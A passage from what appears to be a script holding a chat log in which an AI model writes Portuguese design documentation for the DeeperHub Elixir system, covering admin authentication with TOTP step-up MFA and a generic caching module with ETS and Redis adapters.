*   **Administrador Faz Login no Painel:**
    *   Admin fornece username/senha na p√°gina de login do painel.
    *   `AdminAuth.authenticate_admin/3` √© chamado.
    *   Credenciais s√£o validadas.
    *   Se MFA estiver configurado, o fluxo de verifica√ß√£o TOTP (ou outro m√©todo) √© iniciado.
    *   Se tudo ok, uma sess√£o de admin √© criada e um token √© emitido.
*   **Administrador Tenta Excluir um Usu√°rio:**
    *   Admin clica em \"Excluir Usu√°rio\" na interface.
    *   A interface chama um endpoint protegido.
    *   O backend verifica a sess√£o do admin.
    *   Chama `AdminAuth.authorize_action(admin_id, :delete_user, %{target_user_id: \"xyz\"}, mfa_code_if_required)`.
    *   `AdminActionAuthService` verifica se a a√ß√£o `:delete_user` requer MFA \"step-up\". Se sim, valida `mfa_code`.
    *   Verifica se o admin tem a permiss√£o \"pode_excluir_usuarios\" (via `PermissionService` / RBAC).
    *   Se autorizado, a a√ß√£o √© permitida.
    *   `AdminActionLog` registra a a√ß√£o.
*   **Administrador Altera uma Configura√ß√£o de Seguran√ßa Cr√≠tica:**
    *   Similar ao caso acima, mas a a√ß√£o pode ser, por exemplo, `:update_security_policy_mfa`.
    *   A autoriza√ß√£o e a poss√≠vel exig√™ncia de MFA step-up s√£o verificadas.

## üåä 5. Fluxos Importantes

### Fluxo de Autentica√ß√£o de Administrador com TOTP

1.  **Interface de Login Admin:** Admin submete username e password.
2.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.authenticate_admin(username, password, context)`.
3.  **`AdminAuthService`:**
    *   Valida credenciais prim√°rias (username/password).
    *   Se falhar, retorna erro e registra tentativa falha (considerando `BruteForceProtection` para admin).
    *   Se sucesso, verifica se o admin tem TOTP configurado e ativo (via `AdminTOTPService.is_enabled?(admin_id)`).
    *   **Se TOTP Ativo:** Retorna `{:error, :mfa_totp_required, %{admin_id: admin.id}}` para o controller.
    *   **Se TOTP N√£o Ativo (e n√£o mandat√≥rio):** Procede para criar sess√£o e token (via `AdminTokenService`).
4.  **Interface de Login Admin:** Se `:mfa_totp_required`, exibe campo para c√≥digo TOTP. Admin submete o c√≥digo.
5.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.Services.AdminTOTPService.verify(admin_id, totp_code)`.
6.  **`AdminTOTPService`:**
    *   Verifica o c√≥digo TOTP.
    *   Se v√°lido, retorna `{:ok, :valid}`.
    *   Se inv√°lido, retorna erro e registra tentativa falha de MFA.
7.  **Backend Controller (ap√≥s TOTP v√°lido):**
    *   Chama `AdminAuthService` (ou diretamente `AdminTokenService` e `SessionManager`) para criar a sess√£o de admin e emitir tokens.
    *   Registra login bem-sucedido no `AdminActionLog`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security.AdminAuth`)

### 6.1. `DeeperHub.Security.AdminAuth.authenticate_admin(username :: String.t(), password :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :invalid_credentials | :account_locked | :mfa_required | :mfa_invalid}`

*   **Descri√ß√£o:** Autentica um administrador.
*   **`opts`:** `:ip_address`, `:device_info`, `:mfa_code` (se o fluxo de MFA for em uma √∫nica etapa).

### 6.2. `DeeperHub.Security.AdminAuth.verify_admin_mfa(admin_id :: String.t(), mfa_method :: atom(), code :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :mfa_invalid | :max_attempts_reached}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Verifica um c√≥digo MFA para um admin que j√° passou pela autentica√ß√£o prim√°ria. Se sucesso, finaliza o login e retorna tokens.
*   **`mfa_method`:** Ex: `:totp`.

### 6.3. `DeeperHub.Security.AdminAuth.has_admin_permission?(admin_id :: String.t(), permission :: String.t() | atom(), resource_details :: map() | nil) :: boolean()`

*   **Descri√ß√£o:** Verifica se um administrador possui uma permiss√£o espec√≠fica.
*   **`permission`:** Ex: `\"users:delete\"`, `:view_audit_logs`.

### 6.4. `DeeperHub.Security.AdminAuth.authorize_action(admin_id :: String.t(), action_atom :: atom(), action_params :: map() | nil, verification_data :: map() | nil) :: :ok | {:error, :unauthorized | :mfa_required_for_action | :mfa_invalid}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Autoriza uma a√ß√£o administrativa, possivelmente exigindo \"step-up authentication\" (MFA).
*   **`action_atom`:** Identificador √∫nico da a√ß√£o administrativa (ex: `:admin_update_user_role`).
*   **`verification_data`:** `%{mfa_code: \"123456\"}` se MFA for exigido pela pol√≠tica da a√ß√£o.

### 6.5. Fun√ß√µes CRUD para Admins (ex: `create_admin/1`, `get_admin/1`, `list_admins/1`, `update_admin/2`, `deactivate_admin/2`)

*   Estas fun√ß√µes gerenciariam as contas dos administradores.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :admin_auth, :password_policy, :min_length]`** (Integer): Comprimento m√≠nimo da senha de admin. (Padr√£o: `12`)
*   **`[:security, :admin_auth, :password_policy, :expiry_days]`** (Integer): Dias para expira√ß√£o da senha de admin. (Padr√£o: `90`)
*   **`[:security, :admin_auth, :mfa, :is_mandatory]`** (Boolean): Se MFA √© obrigat√≥rio para todos os admins. (Padr√£o: `true`)
*   **`[:security, :admin_auth, :mfa, :allowed_methods]`** (List de Atoms): M√©todos MFA permitidos para admins (ex: `[:totp, :security_key]`).
*   **`[:security, :admin_auth, :session, :max_duration_seconds]`** (Integer): Dura√ß√£o m√°xima da sess√£o de admin. (Padr√£o: `28800` - 8 horas)
*   **`[:security, :admin_auth, :session, :idle_timeout_seconds]`** (Integer): Timeout de inatividade para sess√£o de admin. (Padr√£o: `900` - 15 minutos)
*   **`[:security, :admin_auth, :brute_force, :max_login_attempts]`** (Integer): M√°ximo de tentativas de login admin antes do bloqueio. (Padr√£o: `3`)
*   **`[:security, :admin_auth, :brute_force, :lockout_duration_minutes]`** (Integer): Dura√ß√£o do bloqueio de conta admin. (Padr√£o: `60`)
*   **`[:security, :admin_auth, :actions, <action_name>, :requires_mfa_step_up]`** (Boolean): Define se uma a√ß√£o admin espec√≠fica requer re-autentica√ß√£o MFA.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth` (potencialmente para a base de hashing de senha, gerenciamento de sess√£o, se n√£o for totalmente separado).
*   `DeeperHub.MFA`: Para a l√≥gica de TOTP e outros m√©todos MFA.
*   `DeeperHub.RBAC`: Para gerenciamento de pap√©is e permiss√µes administrativas.
*   `DeeperHub.Audit`: Essencial para registrar todas as a√ß√µes administrativas.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger o login de admin.
*   `DeeperHub.Tokens`: Para gerenciamento de tokens de sess√£o de admin.

### 8.2. Bibliotecas Externas

*   As mesmas de `DeeperHub.Auth` (Joken, Argon2, etc.) se compartilhar a base.
*   Bibliotecas TOTP (ex: `ex_totp`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Interface de Administra√ß√£o (Web ou Console):**
    *   Usar `AdminAuth.authenticate_admin/3` para o fluxo de login.
    *   Antes de executar qualquer a√ß√£o administrativa, chamar `AdminAuth.has_admin_permission?/3` ou `AdminAuth.authorize_action/4`.
*   **Prote√ß√£o de Rotas (Phoenix):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :admin_auth do
      plug MyAppWeb.Plugs.VerifyAdminSessionPlug # Verifica token de sess√£o de admin
      plug MyAppWeb.Plugs.VerifyAdminPermissionPlug, permission: :access_admin_panel # Permiss√£o gen√©rica para painel
    end

    scope \"/admin\", DeeperHubWeb.Admin do
      pipe_through [:browser, :admin_auth]
      # ... rotas do painel admin ...
    end
    ```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo de login de admin com e sem MFA.
*   Testar a cria√ß√£o e gerenciamento de contas de admin.
*   Testar a l√≥gica de autoriza√ß√£o de a√ß√µes (com e sem permiss√£o, com e sem step-up MFA).
*   Testar a aplica√ß√£o de pol√≠ticas de senha e sess√£o espec√≠ficas para admin.
*   Verificar se todas as a√ß√µes administrativas s√£o corretamente auditadas.
*   Localiza√ß√£o: `test/deeper_hub/security/admin_auth/`.

### 10.2. M√©tricas

*   `deeper_hub.security.admin_auth.login.attempts.count` (tags: `status` (`success`, `failure`, `mfa_required`))
*   `deeper_hub.security.admin_auth.actions.authorized.count` (tags: `action_name`, `status` (`granted`, `denied_permission`, `denied_mfa`))
*   `deeper_hub.security.admin_auth.accounts.created.count`
*   `deeper_hub.security.admin_auth.sessions.active.gauge`

### 10.3. Logs

*   **N√≠vel INFO:** Login de admin bem-sucedido, a√ß√£o administrativa autorizada e executada.
*   **N√≠vel WARNING:** Tentativa de login de admin falha, tentativa de a√ß√£o n√£o autorizada, MFA falhou para a√ß√£o step-up.
*   **N√≠vel ERROR:** Erros internos no `AdminAuthService` ou seus componentes.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :admin_auth, :login, :start | :stop | :exception]`
    *   Metadados: `%{username: username, ip_address: ip}`
*   `[:deeper_hub, :security, :admin_auth, :action_authorization, :start | :stop | :exception]`
    *   Metadados: `%{admin_id: id, action: action_name, permission_check_result: res, mfa_step_up_result: res}`
*   `[:deeper_hub, :security, :admin_auth, :account_management, :stop]`
    *   Metadados: `%{action: :create | :update | :deactivate, target_admin_id: id, performed_by_admin_id: id}`

## ‚ùå 11. Tratamento de Erros

*   Falhas de autentica√ß√£o ou autoriza√ß√£o devem ser tratadas de forma segura, negando o acesso e registrando a tentativa.
*   Erros internos devem ser logados e n√£o expor informa√ß√µes sens√≠veis.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Prote√ß√£o das Credenciais de Admin:** As senhas de admin devem ser tratadas com o mais alto n√≠vel de seguran√ßa.
*   **MFA Forte:** Incentivar ou obrigar o uso de m√©todos MFA fortes (TOTP, Chaves de Seguran√ßa) em vez de SMS para admins.
*   **Auditoria Imut√°vel:** Os logs de `AdminActionLog` s√£o cr√≠ticos e devem ser protegidos.
*   **Revis√£o de Acesso:** Realizar revis√µes peri√≥dicas das contas de administrador e suas permiss√µes.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Qualquer nova funcionalidade administrativa deve ter suas permiss√µes de acesso claramente definidas no `PermissionService` (ou RBAC).
*   A√ß√µes de alto risco devem ser consideradas para \"step-up authentication\" com MFA.
*   Garanta que todas as a√ß√µes de modifica√ß√£o de estado sejam auditadas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar suporte para Chaves de Seguran√ßa (WebAuthn) como m√©todo MFA para administradores.
*   [ ] Adicionar \"sess√µes de administrador com privil√©gios elevados\" que expiram mais rapidamente ou exigem re-autentica√ß√£o para certas opera√ß√µes.
*   [ ] Desenvolver alertas para atividades administrativas suspeitas (ex: login de admin de novo IP/dispositivo, m√∫ltiplas a√ß√µes de alto risco em curto per√≠odo).
*   [ ] Integrar com um sistema de gerenciamento de identidade centralizado (IdP) para administradores, se aplic√°vel em ambientes corporativos maiores.
*   [ ] Permitir configura√ß√£o de \"hor√°rios de acesso permitidos\" para contas de administrador.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

A seguran√ßa administrativa √© uma √°rea densa, mas fundamental.

Agora, qual o pr√≥ximo m√≥dulo? Talvez `DeeperHub.Core.Cache` para variar um pouco e sair da camada de seguran√ßa, ou prefere continuar com os outros m√≥dulos de seguran√ßa como `DdosProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos ent√£o detalhar o `DeeperHub.Core.Cache`. Este √© um m√≥dulo de infraestrutura crucial para o desempenho de toda a aplica√ß√£o.

---

# M√≥dulo: `DeeperHub.Core.Cache` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Cache`

O m√≥dulo `DeeperHub.Core.Cache` fornece uma **fachada e um servi√ßo de caching gen√©rico** para o sistema DeeperHub. Seu prop√≥sito √© melhorar o desempenho da aplica√ß√£o armazenando temporariamente dados frequentemente acessados ou resultados de opera√ß√µes custosas, reduzindo a lat√™ncia e a carga sobre fontes de dados prim√°rias (como bancos de dados ou APIs externas).

Ele oferece uma API simples para opera√ß√µes de cache como `put`, `get`, `delete`, e `get_or_store`, abstraindo a implementa√ß√£o de cache subjacente (que pode ser ETS, Redis, Memcached, etc., atrav√©s de um `CacheAdapter`). üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Shared.Cache` e `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter`. Esta documenta√ß√£o consolida a fachada principal em `DeeperHub.Core.Cache` e assume que a l√≥gica de servi√ßo e adapta√ß√£o reside em `DeeperHub.Shared.Cache.*` ou √© diretamente gerenciada pela fachada se for uma implementa√ß√£o simples como ETS.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Armazenamento Chave-Valor:**
    *   Armazenar dados associados a uma chave √∫nica (`put/4`).
    *   Recuperar dados com base em uma chave (`get/3`).
*   **Expira√ß√£o de Cache (TTL - Time To Live):**
    *   Permitir a defini√ß√£o de um tempo de vida para cada entrada de cache.
    *   Automaticamente considerar entradas expiradas como \"misses\".
*   **Invalida√ß√£o de Cache:**
    *   Remover entradas espec√≠ficas do cache (`delete/2`).
    *   Remover todas as entradas de um namespace (se suportado) ou o cache inteiro (`clear/1`).
    *   Remover entradas que correspondem a um padr√£o de chave (`delete_pattern/2`).
*   **Opera√ß√£o \"Get-Or-Store\" (`get_or_store/4`):**
    *   Tentar obter um valor do cache; se for um \"miss\" (n√£o encontrado ou expirado), executar uma fun√ß√£o fornecida para gerar o valor, armazen√°-lo no cache e ent√£o retorn√°-lo.
*   **Suporte a Namespaces (Opcional):**
    *   Permitir a organiza√ß√£o de chaves de cache em namespaces para evitar colis√µes e facilitar a invalida√ß√£o em grupo.
*   **Opera√ß√µes At√¥micas (Opcional, dependendo do backend):**
    *   Suporte para opera√ß√µes como `increment/4` e `decrement/4` para contadores em cache.
    *   Suporte para opera√ß√µes em conjuntos (ex: `add_to_set/3`).
*   **Abstra√ß√£o de Backend de Cache:**
    *   Fornecer uma interface (`CacheBehaviour`) para que diferentes backends de cache (ETS, Redis, etc.) possam ser usados de forma intercambi√°vel.
*   **M√©tricas e Observabilidade:**
    *   Registrar m√©tricas como taxa de acerto (hit rate), taxa de erro (miss rate), tamanho do cache, lat√™ncia das opera√ß√µes de cache.
*   **Limpeza de Entradas Expiradas (para backends que n√£o fazem isso automaticamente):**
    *   Implementar ou configurar um mecanismo para remover periodicamente entradas expiradas para liberar mem√≥ria (especialmente para caches em mem√≥ria como ETS).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Cache` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes de cache.
    *   Delega chamadas para o `DeeperHub.Shared.Cache.CacheAdapter` configurado.
2.  **`DeeperHub.Shared.Cache.CacheAdapter` (GenServer):**
    *   **Responsabilidade:** Gerencia a l√≥gica de intera√ß√£o com a implementa√ß√£o de cache escolhida.
    *   **Intera√ß√µes:** Recebe chamadas da fachada e as traduz para opera√ß√µes no backend de cache (ex: `EtsCache`).
    *   Pode lidar com a l√≥gica de serializa√ß√£o/desserializa√ß√£o se o backend de cache exigir.
3.  **`DeeperHub.Shared.Cache.CacheBehaviour` (Behaviour):**
    *   Define a interface que todas as implementa√ß√µes de backend de cache devem seguir.
4.  **Implementa√ß√µes de Backend de Cache (Exemplos):**
    *   **`DeeperHub.Shared.Cache.Implementations.EtsCache` (GenServer ou m√≥dulo funcional usando ETS):**
        *   Implementa√ß√£o de cache em mem√≥ria usando tabelas ETS.
        *   Gerencia TTLs e limpeza de entradas expiradas.
    *   **`DeeperHub.Shared.Cache.Implementations.RedisAdapter` (M√≥dulo):**
        *   Adaptador para interagir com um servidor Redis externo (usando uma biblioteca como `Redix`).
    *   **`DeeperHub.Shared.Cache.Implementations.NoOpCache` (M√≥dulo Funcional):**
        *   Uma implementa√ß√£o que n√£o faz nada, efetivamente desabilitando o cache. √ötil para desenvolvimento ou testes.
5.  **`DeeperHub.Shared.Cache.MetricsReporter` (GenServer):**
    *   Coleta e armazena m√©tricas sobre o desempenho do cache.
6.  **`DeeperHub.Shared.Cache.Supervisor`:**
    *   Supervisiona os processos relacionados ao cache (ex: `CacheAdapter`, `EtsCache GenServer`, `MetricsReporter`).
7.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager`):**
    *   Qual adaptador de cache usar, TTL padr√£o, configura√ß√µes espec√≠ficas do backend (ex: URL do Redis).

### 3.2. Estrutura de Diret√≥rios (Proposta para `Shared.Cache`)

```
lib/deeper_hub/shared/cache/
‚îú‚îÄ‚îÄ cache_adapter.ex                # GenServer que delega para a implementa√ß√£o
‚îú‚îÄ‚îÄ cache_behaviour.ex              # Behaviour para implementa√ß√µes de cache
‚îÇ
‚îú‚îÄ‚îÄ implementations/                # Ou apenas no mesmo n√≠vel se forem poucos
‚îÇ   ‚îú‚îÄ‚îÄ ets_cache.ex                # Implementa√ß√£o com ETS (pode ser GenServer)
‚îÇ   ‚îú‚îÄ‚îÄ redis_adapter.ex            # Adaptador para Redis
‚îÇ   ‚îî‚îÄ‚îÄ no_op_cache.ex              # Cache que n√£o faz nada
‚îÇ
‚îú‚îÄ‚îÄ metrics_reporter.ex             # GenServer para coletar m√©tricas de cache
‚îú‚îÄ‚îÄ supervisor.ex                   # Supervisor para os GenServers do cache
‚îî‚îÄ‚îÄ telemetry.ex                    # Para emitir eventos de telemetria do cache
```
E a fachada em:
```
lib/deeper_hub/core/cache.ex        # Fachada P√∫blica
```

### 3.3. Decis√µes de Design Importantes

*   **Abstra√ß√£o de Backend:** A capacidade de trocar o backend de cache (ex: de ETS para Redis) sem alterar o c√≥digo da aplica√ß√£o √© uma grande vantagem.
*   **Consist√™ncia de Chaves:** Definir uma estrat√©gia clara para nomea√ß√£o de chaves de cache, incluindo namespaces, para evitar colis√µes.
*   **Estrat√©gias de Invalida√ß√£o:** Al√©m do TTL, considerar estrat√©gias de invalida√ß√£o baseadas em eventos (ex: quando um dado no DB √© atualizado, invalidar a entrada de cache correspondente).
*   **Tratamento de Falhas no Cache:** Falhas no servi√ßo de cache n√£o devem impedir o funcionamento da aplica√ß√£o. O sistema deve ser capaz de operar (com degrada√ß√£o de performance) se o cache estiver indispon√≠vel, buscando os dados da fonte prim√°ria.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Caching de Dados de Usu√°rio Frequentemente Acessados:**
    *   Ao buscar o perfil de um usu√°rio, o `DeeperHub.Accounts.ProfileService` primeiro verifica o cache: `Cache.get(\"user_profile:#{user_id}\")`.
    *   Se for um \"miss\", busca no DB, e depois armazena no cache: `Cache.put(\"user_profile:#{user_id}\", profile_data, ttl: 3600)`.
*   **Caching de Resultados de Consultas Complexas:**
    *   Um servi√ßo que gera um relat√≥rio custoso pode usar `Cache.get_or_store(\"reports:monthly_sales:#{month}\", fn -> generate_sales_report(month) end, ttl: 86400)`.
*   **Contadores em Cache:**
    *   Rastrear o n√∫mero de visualiza√ß√µes de um post: `Cache.increment(\"post_views:#{post_id}\")`.
*   **Invalida√ß√£o de Cache Baseada em Eventos:**
    *   O `DeeperHub.Accounts.ProfileService`, ao atualizar um perfil, publica um evento `profile_updated`.
    *   Um assinante desse evento (poderia ser o pr√≥prio `ProfileService` ou um worker dedicado) chama `Cache.delete(\"user_profile:#{updated_user_id}\")`.

## üåä 5. Fluxos Importantes

### Fluxo de `get_or_store/4`

1.  **Chamador:** Um servi√ßo chama `DeeperHub.Core.Cache.get_or_store(key, generator_fun, opts)`.
    *   `opts` pode conter `:ttl_seconds` e `:namespace`.
2.  **`Core.Cache` (Fachada):** Delega para `Shared.Cache.CacheAdapter.get_or_store(...)`.
3.  **`Shared.Cache.CacheAdapter`:**
    *   Chama `get(key, opts_com_namespace)` na implementa√ß√£o de backend configurada (ex: `EtsCache`).
4.  **Backend de Cache (ex: `EtsCache`):**
    *   Verifica se a `key` existe e n√£o est√° expirada.
    *   **Cache Hit:** Se sim, retorna `{:ok, cached_value}` para o `CacheAdapter`.
    *   **Cache Miss:** Se n√£o, retorna `{:error, :not_found}` para o `CacheAdapter`.
5.  **`Shared.Cache.CacheAdapter`:**
    *   **Se Cache Hit:** Retorna o `cached_value` para a fachada, que retorna para o chamador.
    *   **Se Cache Miss:**
        *   Executa a `generator_fun.()`.
        *   Se a fun√ß√£o retornar `{:ok, new_value}`:
            *   Chama `put(key, new_value, opts_com_ttl_e_namespace)` na implementa√ß√£o de backend.
            *   Retorna `new_value` para a fachada.
        *   Se a fun√ß√£o retornar `{:error, reason}`:
            *   Loga o erro.
            *   Retorna `{:error, reason}` para a fachada (e n√£o armazena no cache).
6.  **`Core.Cache` (Fachada):** Retorna o valor (do cache ou gerado) ou o erro para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Core.Cache`)

*(Baseado na API do `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter` da documenta√ß√£o original, consolidando e usando TTLs em segundos para consist√™ncia).*

### 6.1. `DeeperHub.Core.Cache.get(key :: String.t() | atom(), default_value :: term() | nil, opts :: keyword()) :: {:ok, term()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Recupera um valor do cache.
*   **`opts`:**
    *   `:namespace` (atom | String.t): Namespace opcional para a chave.
*   **Retorno:** `{:ok, value}` se encontrado e n√£o expirado, `{:ok, default_value}` se n√£o encontrado e default fornecido, sen√£o `{:error, :not_found}`.

### 6.2. `DeeperHub.Core.Cache.put(key :: String.t() | atom(), value :: term(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Armazena um valor no cache.
*   **`opts`:**
    *   `:ttl_seconds` (integer | `:infinity`): Tempo de vida em segundos. (Padr√£o: config global `cache.default_ttl_seconds`)
    *   `:namespace` (atom | String.t): Namespace opcional.

### 6.3. `DeeperHub.Core.Cache.delete(key :: String.t() | atom(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Remove uma entrada do cache.
*   **`opts`:** `:namespace`.

### 6.4. `DeeperHub.Core.Cache.get_or_store(key :: String.t() | atom(), generator_fun :: (() -> {:ok, term()} | {:error, term()}), opts :: keyword()) :: {:ok, term()} | {:error, term()}`

*   **Descri√ß√£o:** Obt√©m do cache ou executa `generator_fun`, armazena e retorna o resultado.
*   **`opts`:** `:ttl_seconds`, `:namespace`.
*   **Retorno:** `{:ok, value}` ou `{:error, reason_from_generator_or_cache_error}`.

### 6.5. `DeeperHub.Core.Cache.increment(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Incrementa atomicamente um valor num√©rico no cache. Se a chave n√£o existir, geralmente √© inicializada com `amount`.
*   **`amount`:** (Padr√£o: `1`)
*   **`opts`:** `:ttl_seconds`, `:namespace`.

### 6.6. `DeeperHub.Core.Cache.decrement(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Decrementa atomicamente um valor num√©rico.
*   *(Par√¢metros e retorno similares a `increment/4`)*

### 6.7. `DeeperHub.Core.Cache.clear(opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Limpa o cache.
*   **`opts`:** `:namespace` (para limpar apenas um namespace).

### 6.8. `DeeperHub.Core.Cache.delete_pattern(key_pattern :: String.t(), opts :: keyword()) :: {:ok, count_deleted :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Remove entradas do cache que correspondem a um padr√£o de chave (ex: `\"user_profiles:*\"`, a sintaxe do padr√£o depende do backend).
*   **`opts`:** `:namespace`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :cache, :enabled]`** (Boolean): Habilita/desabilita o sistema de cache globalmente. (Padr√£o: `true`)
*   **`[:core, :cache, :default_adapter]`** (Module): M√≥dulo adaptador de cache padr√£o a ser usado (ex: `DeeperHub.Shared.Cache.Implementations.EtsCache`, `DeeperHub.Shared.Cache.Implementations.RedisAdapter`).
*   **`[:core, :cache, :default_ttl_seconds]`** (Integer): TTL padr√£o em segundos para novas entradas de cache se n√£o especificado. (Padr√£o: `3600` - 1 hora)
*   **`[:core, :cache, :ets_cache, :cleanup_interval_ms]`** (Integer): Intervalo para limpeza de entradas expiradas no `EtsCache`. (Padr√£o: `60000`)
*   **`[:core, :cache, :redis_adapter, :url]`** (String): URL de conex√£o para o Redis, se usado.
*   **`[:core, :cache, :redis_adapter, :pool_size]`** (Integer): Tamanho do pool de conex√µes Redis.
*   **`[:core, :cache, :metrics_reporter, :report_interval_ms]`** (Integer): Intervalo para o `MetricsReporter` coletar/logar estat√≠sticas do cache.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes do cache.
*   `DeeperHub.Core.Logger`: Para logging de opera√ß√µes e erros do cache.
*   `DeeperHub.Core.Metrics`: Para registrar m√©tricas de desempenho do cache.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos do `Shared.Cache`.

### 8.2. Bibliotecas Externas

*   Depende da implementa√ß√£o do backend:
    *   Nenhuma para ETS (nativo).
    *   `Redix` (ou similar) se `RedisAdapter` for usado.
    *   Outras bibliotecas cliente para outros backends (Memcached, etc.).

## ü§ù 9. Como Usar / Integra√ß√£o

Qualquer m√≥dulo que precise de caching pode usar a fachada `DeeperHub.Core.Cache`.

```elixir
defmodule MyApp.UserProfileService do
  alias DeeperHub.Core.Cache
  alias DeeperHub.Core.Repo
  alias MyApp.User

  def get_user_profile(user_id) do
    cache_key = \"user_profile:#{user_id}\"
    
    Cache.get_or_store(cache_key, fn ->
      case Repo.get(User, user_id) do
        nil -> {:error, :not_found} # N√£o armazena :not_found no cache por padr√£o
        user -> {:ok, Map.from_struct(user)} # Armazena o mapa
      end
    end, ttl_seconds: 1800) # Cache por 30 minutos
  end

  def update_user_profile(user, attrs) do
    # ... l√≥gica de atualiza√ß√£o ...
    case Repo.update(changeset) do
      {:ok, updated_user} ->
        Cache.delete(\"user_profile:#{updated_user.id}\") # Invalida o cache
        {:ok, updated_user}
      {:error, changeset} ->
        {:error, changeset}
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o da API do cache (`get`, `put`, `delete`, `get_or_store`, `increment`).
*   Testar a l√≥gica de TTL e expira√ß√£o.
*   Testar a invalida√ß√£o por chave e por padr√£o.
*   Testar o comportamento com diferentes adaptadores de backend (mockeados ou reais em ambiente de teste).
*   Testar o tratamento de falhas do backend de cache (o cache n√£o deve quebrar a aplica√ß√£o).
*   Localiza√ß√£o: `test/deeper_hub/core/cache/` e `test/deeper_hub/shared/cache/`.

### 10.2. M√©tricas (via `Shared.Cache.MetricsReporter` ou `Core.Metrics`)

*   `deeper_hub.core.cache.operations.count` (tags: `operation` (`get`, `put`, `delete`), `namespace`, `status` (`hit`, `miss`, `success`, `error`))
*   `deeper_hub.core.cache.operation.duration_ms` (Histograma, tags: `operation`, `namespace`)
*   `deeper_hub.core.cache.size.items.gauge` (Gauge, tags: `namespace`): N√∫mero de itens no cache.
*   `deeper_hub.core.cache.size.bytes.gauge` (Gauge, tags: `namespace`, opcional): Tamanho estimado em bytes.
*   `deeper_hub.core.cache.hit_ratio.gauge` (Gauge, tags: `namespace`): Taxa de acerto (hits / (hits + misses)).
*   `deeper_hub.core.cache.evictions.count` (Contador, tags: `namespace`, `reason` (`ttl`, `manual`, `lru`)): N√∫mero de itens removidos.

### 10.3. Logs

*   **N√≠vel DEBUG:** Detalhes de opera√ß√µes de cache (get, put, delete) com chaves e namespaces.
*   **N√≠vel INFO:** Limpeza de cache iniciada/conclu√≠da. Inicializa√ß√£o do adaptador de cache.
*   **N√≠vel WARNING:** Alta taxa de \"cache miss\". Cache se aproximando da capacidade m√°xima (se aplic√°vel).
*   **N√≠vel ERROR:** Falha ao conectar ao backend de cache (ex: Redis). Erros persistentes em opera√ß√µes de cache.

### 10.4. Telemetria (via `Shared.Cache.Telemetry`)

*   `[:deeper_hub, :core, :cache, :operation, :start | :stop | :exception]`
    *   Metadados: `%{operation: :get | :put | :delete, key: key, namespace: ns, backend_adapter: adapter}`
    *   No `:stop`: `%{result: :hit | :miss | :success, value_size: bytes_if_applicable}`
*   `[:deeper_hub, :core, :cache, :cleanup, :start | :stop]`
    *   Medi√ß√µes: `%{items_removed: count}`

## ‚ùå 11. Tratamento de Erros

*   **Cache Indispon√≠vel:** Se o backend de cache (ex: Redis) estiver offline, as opera√ß√µes de cache devem falhar graciosamente. `get_or_store` deve executar a fun√ß√£o geradora e retornar seu resultado diretamente, sem tentar armazenar. `put` e `delete` podem simplesmente logar o erro e retornar `:ok` (ou um erro n√£o bloqueante) para n√£o quebrar o fluxo da aplica√ß√£o.
*   **Erro de Serializa√ß√£o:** Se os dados n√£o puderem ser serializados para o cache, um erro deve ser logado e a opera√ß√£o de cache deve falhar.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **N√£o Armazenar Dados Extremamente Sens√≠veis em Cache (a menos que o cache seja seguro):** Se o backend de cache n√£o for t√£o seguro quanto o banco de dados prim√°rio (ex: Redis sem criptografia em tr√¢nsito/repouso vs. DB com TDE), evite cachear dados altamente sens√≠veis.
